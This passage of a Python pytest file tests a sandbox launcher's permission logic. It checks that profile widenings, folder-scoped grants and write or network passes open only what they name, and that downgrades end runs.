    def test_a_scratch_standing_in_for_a_project_is_nobodys_repository(self, w):
        assert L.core.project_git_state(str(w.scratch), str(w.scratch)) == "unborn"

    def test_any_other_word_and_a_missing_parameter_are_refused(self, w):
        assert "locked or unborn" in str(_refused(w, w.request(["/bin/echo"], params=_flags(w, write="0", git="open"))))
        params = [item for item in _flags(w, write="0") if not item.startswith("PROJECT_GIT=")]
        assert "missing profile parameter PROJECT_GIT" in str(_refused(w, w.request(["/bin/echo"], params=params)))


class TestWideningsTiedToTheProgram:
    def _install(self, w, where):
        where.mkdir(parents=True, exist_ok=True)
        (where / "run").write_text("")
        return where

    def _exec_line(self, install):
        return f'(allow file-read* process-exec (subpath "{install}"))'

    def test_a_widening_runs_only_the_program_it_grants_exec_of(self, w):
        install = self._install(w, w.rt / "tool")
        profile = w.widened(self._exec_line(install))
        req = w.request([str(install / "run")], params=_flags(w, profile=profile), profile=profile)
        assert w.validator().request(req)["start"]["cls"] == "project"
        other = w.request(["/bin/sh", "-c", "true"], params=_flags(w, profile=profile), profile=profile)
        assert _refused(w, other).code == "profile-unknown"

    @pytest.mark.parametrize("line", ['(allow network-outbound (remote ip "localhost:*"))',
                                      '(allow network-bind network-inbound (local ip "localhost:*"))',
                                      '(allow mach-lookup (global-name "com.apple.coreservices.launchservicesd"))',
                                      '(allow iokit-open (iokit-user-client-class "RootDomainUserClient"))'])
    def test_the_lines_the_browser_once_had_pass_for_no_program_even_in_a_store_ruling_r1(self, w, line):
        """G16: agent-browser in a store main named was the one program these opened for; the door replaced that path."""
        store = w.root / "hermes-tools"
        program = self._install(w, store / "agent-browser")
        index = L.core.parse_spec(json.dumps({**json.loads(w.spec), "toolStoreRoots": [str(store)]}))
        validator = L.Validator(index, str(w.ledger), ([str(w.rt), str(store)], [str(w.root / "scratch")]))
        profile = w.widened(self._exec_line(program), line)
        with pytest.raises(L.Refusal) as err:
            validator.request(w.request([str(program / "run")], params=_flags(w, profile=profile), profile=profile))
        assert err.value.code == "profile-unknown"


class TestLens4Pass:
    """fx17: lens4-pass H1, M1 and M2 on the launcher side (the lens's proofs are kept outside this repository)."""

    @staticmethod
    def _other(w):
        other = w.root / "other"
        (other / ".git").mkdir(parents=True)
        return other

    @staticmethod
    def _scratch_flags(w, net="1"):
        return [f"PROJECT_ROOT={w.scratch}", f"SCRATCH={w.scratch}", f"OUTPUT_DIR={w.scratch / 'output'}",
                f"NET={net}", "WRITE_PROJECT=0", "PROJECT_GIT=locked", f"MEMBER={w.token(None)}"]

    @staticmethod
    def _with_pass(w, cls, *, project="proj", flags=None) -> dict:
        (w.ledger / L.PASS_FILE).unlink(missing_ok=True)
        w.pass_(cls=cls, project=project)
        return w.validator().request(w.request(["/bin/echo"], params=flags or _flags(w, net="1", write="1")))["start"]

    def test_h1_a_project_grant_lifts_only_a_run_in_its_own_folder_by_identity(self, w):
        # lens4-pass H1 (P1): a grant for `other` lifted a run in `proj`. Now it lifts only its folder, by identity.
        other = self._other(w)
        grant = {"id": "g", "cls": "X", "scope": "project", "sessionId": None}
        w.policy("manual", listed=[str(w.proj), str(other)], grants=[{**grant, "project": str(other)}])
        start = w.validator().request(w.request(["/bin/echo"], params=_flags(w, net="1", write="1")))["start"]
        assert start["write"] is False and start["net"] is False and start["narrowed"] is True
        link = w.root / "link"
        link.symlink_to(w.proj)
        w.policy("manual", listed=[str(w.proj)], grants=[{**grant, "project": str(link)}])  # identity, not text
        start = w.validator().request(w.request(["/bin/echo"], params=_flags(w, net="1", write="1")))["start"]
        assert start["write"] is True and start["net"] is True and "narrowed" not in start

    def test_h1_a_session_or_standing_grant_lifts_every_listed_folder_as_s1_says(self, w):
        for scope, extra in (("session", {"sessionId": "s1", "project": None}),
                             ("standing", {"sessionId": None, "project": None})):
            w.policy("manual", grants=[{"id": "g", "cls": "X", "scope": scope, **extra}])
            start = w.validator().request(w.request(["/bin/echo"],
                                                    params=_flags(w, net="1", write="1", session="s2")))["start"]
            assert start["write"] is True and start["net"] is True, scope

    def test_h1_a_scratch_run_takes_a_project_grant_of_any_folder_for_the_network(self, w):
        other = self._other(w)
        w.policy("manual", grants=[{"id": "g", "cls": "N", "scope": "project", "sessionId": None,
                                    "project": str(other)}])
        assert w.validator().request(w.request(["/bin/echo"], params=self._scratch_flags(w)))["start"]["net"] is True

    def test_m1_a_pass_lifts_only_the_class_the_user_allowed(self, w):
        # lens4-pass M1 (P3): a write_file allow opened the network. Wp lifts writes, N the network, X both.
        w.policy("manual")
        start = self._with_pass(w, "Wp")
        assert start["write"] is True and start["net"] is False and start["narrowed_why"] == "needs-network"
        start = self._with_pass(w, "N")
        assert start["write"] is False and start["net"] is True and start["narrowed_why"] == "needs-allow"
        start = self._with_pass(w, "X")
        assert start["write"] is True and start["net"] is True and "narrowed" not in start

    def test_m1_a_scratch_run_takes_the_network_from_an_n_or_x_pass_of_any_folder_only(self, w):
        # lens4-pass M1 (P2): any row at all opened the network for a scratch run; a Wp row or a row that named no
        # folder never does.
        other = self._other(w)
        w.policy("manual")
        flags = self._scratch_flags(w)
        assert self._with_pass(w, "N", project=str(other), flags=flags)["net"] is True
        assert self._with_pass(w, "X", project=str(other), flags=flags)["net"] is True
        assert self._with_pass(w, "Wp", project=str(other), flags=flags)["net"] is False
        assert self._with_pass(w, "N", project=None, flags=flags)["net"] is False

    def test_m1_a_pass_row_without_a_class_lifts_nothing(self, w):
        w.policy("manual")
        row = {"v": 1, "id": "x", "project": str(w.proj), "scope": "once", "ts": time.time(), "exp": time.time() + 120}
        (w.ledger / L.PASS_FILE).write_text(json.dumps(row) + "\n")
        start = w.validator().request(w.request(["/bin/echo"], params=_flags(w, net="1", write="1")))["start"]
        assert start["write"] is False and start["net"] is False

    def test_m2_a_run_under_an_asked_folder_survives_its_drop_but_an_opened_folders_unlisting_kills(self, w):
        # lens4-pass M2: main drops a folder an allowed ask listed when its pass or grant is gone; the run that
        # started under it is left alone, as a pass's expiry leaves a run alone (fx13). A folder the user opened is
        # never unlisted by main, so that unlisting is a downgrade and kills.
        w.policy("acceptEdits", listed=[str(w.proj)], asked=[str(w.proj)])
        v = w.validator()
        plan = v.request(w.request(["/bin/echo"], params=_flags(w, write="1")))
        assert plan["start"]["write"] is True and plan["facts"]["listed_by"] == "ask"
        w.policy("acceptEdits", listed=[])
        v.policy_ok(plan["facts"]["params"], held=plan["facts"])
        w.policy("manual", listed=[])  # a downgrade still kills it
        with pytest.raises(L.Refusal):
            v.policy_ok(plan["facts"]["params"], held=plan["facts"])
        w.policy("acceptEdits", listed=[str(w.proj)])
        plan = v.request(w.request(["/bin/echo"], params=_flags(w, write="1")))
        assert plan["facts"]["listed_by"] is None
        w.policy("acceptEdits", listed=[])
        with pytest.raises(L.Refusal) as err:
            v.policy_ok(plan["facts"]["params"], held=plan["facts"])
        assert str(err.value) == L.NOT_A_LISTED_PROJECT
